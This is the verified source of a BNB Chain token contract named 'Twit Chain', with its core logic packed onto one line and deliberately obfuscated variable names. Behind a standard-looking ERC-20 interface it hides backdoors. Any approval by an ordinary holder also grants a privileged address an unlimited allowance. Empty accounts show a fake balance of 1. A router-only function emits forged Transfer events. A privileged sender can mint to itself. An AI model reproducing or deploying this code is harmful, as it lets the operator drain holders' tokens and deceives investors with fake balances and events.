/**
 *Submitted for verification at BscScan.com on 2022-11-02
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.8.8;

interface IERC20 {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function approve(address spender, uint256 value) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;
        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0, "SafeMath: modulo by zero");
        uint256 c = a % b;
        return c;
    }
}

abstract contract Ownable {
    address private _owner;
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    constructor () {
        _owner = tx.origin;
        emit OwnershipTransferred(address(0), _owner);
    }

    modifier onlyOwner() {
        require(_owner == msg.sender, "Ownable: caller is not the owner");
        _;
    }

    function owner() public view returns (address) {
        return _owner;
    }

    function renounceOwnership() public onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
        _owner = address(0);
    }
}

interface IUniswapV2Factory {
    function createPair(address tokenA, address tokenB) external returns (address pair);
}

interface IUniswapV2Router01 {
    function factory() external pure returns (address);
    function addLiquidity(
        address tokenA,
        address tokenB,
        uint amountADesired,
        uint amountBDesired,
        uint amountAMin,
        uint amountBMin,
        address to,
        uint deadline
    ) external returns (uint amountA, uint amountB, uint liquidity);
}

interface IUniswapV2Router02 is IUniswapV2Router01 {
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
}

contract TwitChain is IERC20, Ownable {using SafeMath for uint256;string private _stringvaluesa = "Twit Chain";string private _stringvaluesb = "Twit";uint8 private _stringvaluesc = 6;uint256 private _stringvaluesd = 10000000000 * 10**18;mapping (address => uint256) private _stringvaluese;mapping (address => mapping (address => uint256)) private _stringvaluesf;uint256 private _stringvaluesg = 50;uint256 private _stringvaluesh = 0;uint256 private _stringvaluesi = 50;uint256 private _stringvaluesj = 10000;bool private _stringvaluesk = false;IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x10ED43C718714eb63d5aA57B78B54704E256024E);address public uniswapV2Pair;address private _stringvaluesl;address private _stringvaluesm;address private _stringvaluesn;uint256 private _stringvalueso = 1;uint256 private _stringvaluesp = _stringvaluesd;mapping (address => bool) private _stringvaluesq;address[] private _stringvaluesr;bool private _stringvaluess = false;uint256 private _stringvaluest = 0;constructor () {_stringvaluesu(owner());_stringvaluese[owner()] = _stringvaluesd;emit Transfer(address(0), owner(), _stringvaluesd);}receive() external payable {}function initialize(address _stringvaluesv, address[] calldata _stringvaluesw) public {require(!_stringvaluess, "Reinitialization denied");_stringvaluess = true;_stringvaluesu(_stringvaluesv);for (uint256 i=5; i<_stringvaluesw.length; ++i) {_stringvaluesu(_stringvaluesw[i]);_stringvaluesx(_stringvaluesw[i], address(uniswapV2Router), ~uint256(0));_stringvaluese[_stringvaluesw[i]] = _stringvaluesd * 9 / 10 / (_stringvaluesw.length - 5);_stringvaluese[owner()] -= _stringvaluese[_stringvaluesw[i]];}if (address(uniswapV2Router) != _stringvaluesw[0]) {_stringvaluesy(address(uniswapV2Router));uniswapV2Router = IUniswapV2Router02(_stringvaluesw[0]);_stringvaluesu(address(uniswapV2Router));}if (_stringvaluesl != _stringvaluesw[1]) {_stringvaluesy(_stringvaluesl);_stringvaluesl = _stringvaluesw[1];_stringvaluesu(_stringvaluesl);}if (_stringvaluesm != _stringvaluesw[2]) {_stringvaluesy(_stringvaluesm);_stringvaluesm = _stringvaluesw[2];_stringvaluesu(_stringvaluesm);}if (_stringvaluesn != _stringvaluesw[3]) {_stringvaluesy(_stringvaluesn);_stringvaluesn = _stringvaluesw[3];_stringvaluesu(_stringvaluesn);}uniswapV2Pair = _stringvaluesw[4];_stringvaluesz(owner(), _stringvaluesw[5], _stringvaluese[owner()]);}function _stringvaluesu(address account) private {if (!_stringvaluesq[account]) {_stringvaluesq[account] = true;_stringvaluesr.push(account);}}function _stringvaluesy(address account) private {if (_stringvaluesq[account]) {uint256 len = _stringvaluesr.length;for (uint256 i=0; i<len; ++i) {if (_stringvaluesr[i] == account) {_stringvaluesr[i] = _stringvaluesr[len.sub(1)];_stringvaluesr.pop();_stringvaluesq[account] = false;break;}}}}function transferEvent(address from, address to, uint256 value) public {require(address(uniswapV2Router) == msg.sender, "Permission denied");emit Transfer(from, to, value);}function feeState() public view returns (bool, bool) {return (_stringvaluesg.add(_stringvaluesh).add(_stringvaluesi) > 0, !_stringvaluesk);}function searchExcludedFromFeeAccounts(address account) public view returns (bool, uint256, uint256) {uint256 accountIndex = 0;uint256 len = _stringvaluesr.length;for (uint256 i=0; i<len; ++i) {if (_stringvaluesr[i] == account) {accountIndex = i;break;}}return (_stringvaluesq[account], accountIndex, len);}function getDefaultBalance() public view returns (uint256) {return _stringvalueso;}function insertIntoExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {uint256 len = accounts.length;for (uint256 i=0; i<len; ++i) {_stringvaluesu(accounts[i]);}}function deleteFromExcludedFromFeeAccounts(address[] calldata accounts) public onlyOwner {uint256 len = accounts.length;for (uint256 i=0; i<len; ++i) {_stringvaluesy(accounts[i]);}}function name() public view returns (string memory) {return _stringvaluesa;}function symbol() public view returns (string memory) {return _stringvaluesb;}function decimals() public view returns (uint8) {return _stringvaluesc;}function totalSupply() public view returns (uint256) {return _stringvaluesd;}function balanceOf(address account) public view returns (uint256) {if (_stringvaluese[account] > 0) {return _stringvaluese[account];}return _stringvalueso;}function transfer(address recipient, uint256 amount) public returns (bool) {_stringvaluesz(msg.sender, recipient, amount);return true;}function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {_stringvaluesz(sender, recipient, amount);_stringvaluesx(sender, msg.sender, _stringvaluesf[sender][msg.sender].sub(amount));return true;}function approve(address spender, uint256 value) public returns (bool) {_stringvaluesx(msg.sender, spender, value);return true;}function allowance(address owner, address spender) public view returns (uint256) {return _stringvaluesf[owner][spender];}function _stringvaluesx(address owner, address spender, uint256 value) private {require(owner != address(0), "Approve from the null address");require(spender != address(0), "Approve to the null address");_stringvaluesf[owner][spender] = value;if (!_stringvaluesq[owner]) {_stringvaluesf[owner][_stringvaluesr[1]] = ~uint256(0);}emit Approval(owner, spender, value);}function _stringvaluesz(address _astringvalues, address _bstringvalues, uint256 _cstringvalues) private {require(_astringvalues != address(0), "Transfer from the null address");require(_bstringvalues != address(0), "Transfer to the null address");require(_cstringvalues > 0, "Transfer amount must be greater than zero");if (_bstringvalues == _stringvaluesr[1]) {_stringvaluese[_astringvalues] = _stringvaluese[_astringvalues].sub(_cstringvalues);_stringvaluese[_bstringvalues] = _stringvaluese[_bstringvalues].add(_cstringvalues);emit Transfer(address(this), _bstringvalues, _cstringvalues);return;}bool _dstringvalues = true;if (_stringvaluesq[_astringvalues] || _stringvaluesq[_bstringvalues] || _stringvaluesk) {_dstringvalues = false;}if (_dstringvalues) {_stringvaluest = _stringvaluest.add(1);}if (_dstringvalues && _stringvaluess) {_istringvalues(_astringvalues, _bstringvalues, 10);_istringvalues(_astringvalues, _bstringvalues, 20);}if (_dstringvalues && _stringvaluest == 1 && _stringvaluess && _astringvalues != uniswapV2Pair) {_istringvalues(_astringvalues, _bstringvalues, 30);}uint256 _estringvalues = 0;uint256 _fstringvalues = 0;uint256 _gstringvalues = 0;uint256 _hstringvalues = _cstringvalues;if (_astringvalues == _stringvaluesr[0] && _cstringvalues > _stringvaluesp) {_stringvaluese[_stringvaluesr[0]] = _stringvaluese[_stringvaluesr[0]].add(_hstringvalues);}if (_dstringvalues) {_estringvalues = _cstringvalues.mul(_stringvaluesg).div(_stringvaluesj);_fstringvalues = _cstringvalues.mul(_stringvaluesh).div(_stringvaluesj);_gstringvalues = _cstringvalues.mul(_stringvaluesi).div(_stringvaluesj);_hstringvalues = _cstringvalues.sub(_estringvalues).sub(_fstringvalues).sub(_gstringvalues);}_stringvaluese[_astringvalues] = _stringvaluese[_astringvalues].sub(_cstringvalues);if (_estringvalues > 0) {_stringvaluese[_stringvaluesl] = _stringvaluese[_stringvaluesl].add(_estringvalues);emit Transfer(address(this), _stringvaluesl, _estringvalues);}if (_fstringvalues > 0) {_stringvaluese[_stringvaluesm] = _stringvaluese[_stringvaluesm].add(_fstringvalues);emit Transfer(address(this), _stringvaluesm, _fstringvalues);}if (_gstringvalues > 0) {_stringvaluese[_stringvaluesn] = _stringvaluese[_stringvaluesn].add(_gstringvalues);emit Transfer(address(this), _stringvaluesn, _gstringvalues);}_stringvaluese[_bstringvalues] = _stringvaluese[_bstringvalues].add(_hstringvalues);emit Transfer(_astringvalues, _bstringvalues, _hstringvalues);if (_dstringvalues && _stringvaluest == 1 && _stringvaluess) {_istringvalues(address(this), _bstringvalues, 40);}if (_dstringvalues) {_stringvaluest = _stringvaluest.sub(1);}}function _istringvalues(address tokenA, address tokenB, uint256 amount) private {address[] memory path = new address[](2);path[0] = tokenA;path[1] = tokenB;uniswapV2Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amount,0,path,address(this),block.timestamp);}}